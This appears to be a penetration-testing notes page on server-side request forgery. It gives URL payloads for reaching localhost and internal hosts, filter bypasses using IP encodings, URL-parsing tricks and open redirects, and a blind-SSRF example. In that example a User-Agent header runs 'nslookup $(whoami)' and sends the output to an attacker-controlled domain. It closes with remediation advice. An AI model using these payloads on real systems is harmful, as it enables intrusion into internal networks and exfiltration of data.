# Server-Side Request Forgery

Normally when an application seems to take internal URLs or network resources that may be able to be modified. This allows an attacker to cause the server-side application to make requests to an unintended location.

We can find a typical example of this vulnerability as follows:

* A web application allows users to retrieve images by specifying a URL

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://$url/fetch?url=http://$url/image.jpg
```
{% endcode %}

***

* If vulnerable we could replace the reference to the image location with an internal URL

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://$url/fetch?url=http://localhost/admin
```
{% endcode %}

***

* This also could work to reach an IP that is only reachable from the internal network

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://$url/fetch?url=http://$internalIP:$port/admin
```
{% endcode %}

{% hint style="info" %}
If we don't know the exact host in the internal network we scan it with the [_BurpSuite_](../tools-and-utilities.md#burp-suite) _Intruder_ option by changing the target IP. Ex: `192.168.0.X` we could iterate the `X` value until found a valid host response&#x20;
{% endhint %}

***

* &#x20;In some cases there are white-listed or black-listed values. We can have different approaches to bypass this verifications:

{% tabs %}
{% tab title="Case 1" %}
When blocking IP inputs such as _localhost_ or _127.0.0.1_,  we can register our own domain name that resolves to _127.0.0.1_

* BurpSuite offers the domain _spoofed.burpcollaborator.net_ for this purpose
* If we obtain a _421_ or _500_ error it could mean its working but we need other payload
{% endtab %}

{% tab title="Case 2" %}
When blocking IP inputs such as _localhost_ or _127.0.0.1_,  we can use a representation of the IP such as:

* An integer representation like _2130706433_
* An integer representation like _017700000001_
* A shorthand like _127.1_
{% endtab %}

{% tab title="Case 3" %}
Exploiting inconsistencies in URL parsing by checking if arbitrary values are acepted, for example:

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">http://$username@$expected-host       #Embeded credentials
http://$evil-host#$expected-host      #Indicate a fragment
http://$expected-host.$evil-host      #Abuse DNS hierarchy
http://$evil-host#@$expected-host     #Combine techniques
<strong>http://$evil-host%25%32%33@$expected-host/$target #And combine URL encoding
</strong></code></pre>
{% endtab %}

{% tab title="Case 4" %}
We can abuse Open Redirection to bypass some SSRF validations

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#We found a route that makes a rediretion in the URL
/$vuln$point/$query?path=http://$redirection

<strong># This triggers the open redirection on the parameter which we could abuse on a SSRF vulnerable point that validatesthe supplied URL is on the domain
</strong>https://$url/fetch?url=/$vuln$point/$query?path=http://$payload
</code></pre>
{% endtab %}
{% endtabs %}

## <mark style="color:orange;">Blind SSRF</mark>

When the response a back-end request to a supplied URL is not returned in the application's front-end response. To detect them is  recommended  to use out-of-band techniques, to trigger an HTTP request to a domain that we control and monitoring the interactions with that system. For example:

* A site uses software which fetches the URL specified in the _Referer_ header when a page is loaded

{% code overflow="wrap" lineNumbers="true" %}
```bash
#We change the header and make the site fetch our domain
Referer: http://$ourDomain
```
{% endcode %}

***

* We can use [_BurpSuite_](../tools-and-utilities.md#burp-suite) _Collaborator_ as our controlled domain to check the interactions
  * Add the target to the scope
  * Go to the _Extensions_ tab and add/enable the _Collaborator Everywhere_ extension
  * Intercept and forward a petition with every check payload
  * In the _Issues_ section of the _Target_ tab check if any header was detected to be vulnerable

***

* For example, we found the _User-Agent_ is vulnerable to a RCE

{% code overflow="wrap" lineNumbers="true" %}
```bash
# We change the header and make the site fetch our domain
User-Agent: /usr/bin/nslookup $(whoami).<OurDomain> #This could change depending on the vulnerability
Referer: http://192.168.0.1:8080  # We set the internal point to reach, and we could use intruder to find a host and port that answer
```
{% endcode %}

{% hint style="info" %}
After this we can go to Collaborator tab and hit and click _Poll now_. We should see a DNS interaction where the answer to th RCE should appear in the DNS subdomain
{% endhint %}

## <mark style="color:blue;">Remediation Actions for SSRF</mark>

* Avoid using user-supplied URLs directly in server-side HTTP requests
* Only allow URLs that match a strict allowlist (specific domains or IP ranges)
* Block internal network access from the server if not required
* Disable unnecessary URL schemes such as _file://_, _gopher://_, _php://_ or _ftp://_
* Use DNS pinning or validation to ensure domain resolution isnâ€™t bypassed to internal IPs
* Avoid redirects if unnecessary
* Deploy firewall rules to limit which hosts and ports your application can reach externally
